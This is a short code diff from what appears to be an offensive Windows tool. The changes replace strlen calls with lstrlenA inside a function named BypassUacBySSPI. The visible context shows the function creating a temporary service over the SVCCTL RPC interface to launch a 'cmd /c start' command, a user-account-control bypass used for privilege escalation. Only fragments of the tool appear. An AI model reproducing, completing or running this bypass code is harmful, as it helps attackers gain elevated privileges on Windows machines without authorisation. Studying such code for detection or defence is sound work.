@@ -151,8 +151,8 @@ DWORD RpcConvertUUID(char* pString, BYTE* pUUID, DWORD dwMaxLength)
 	}
 
 	// check uuid length
-	dwUUIDLength = strlen("00000000-0000-0000-0000-000000000000");
-	if (strlen(pString) != dwUUIDLength)
+	dwUUIDLength = lstrlenA("00000000-0000-0000-0000-000000000000");
+	if (lstrlenA(pString) != dwUUIDLength)
 	{
 		return 1;
 	}
@@ -593,12 +593,12 @@ int BypassUacBySSPI(int argc, char* argv[])
 	// generate a temporary service name
 	RtlSecureZeroMemory(szServiceName, sizeof(szServiceName));
 	wsprintfA(szServiceName, "CreateSvcRpc_%u", GetTickCount());
-	dwServiceNameLength = strlen(szServiceName) + 1;
+	dwServiceNameLength = lstrlenA(szServiceName) + 1;
 
 	// set service command line
 	RtlSecureZeroMemory(szServiceCommandLine, sizeof(szServiceCommandLine));
 	wsprintfA(szServiceCommandLine, "cmd /c start %s", pExecCmd);
-	dwServiceCommandLineLength = strlen(szServiceCommandLine) + 1;
+	dwServiceCommandLineLength = lstrlenA(szServiceCommandLine) + 1;
 
 	// open SVCCTL v2.0
 	if (RpcConnect("ntsvcs", "367abb81-9844-35f1-ad32-98f038001003", 2, &RpcConnection) != 0)
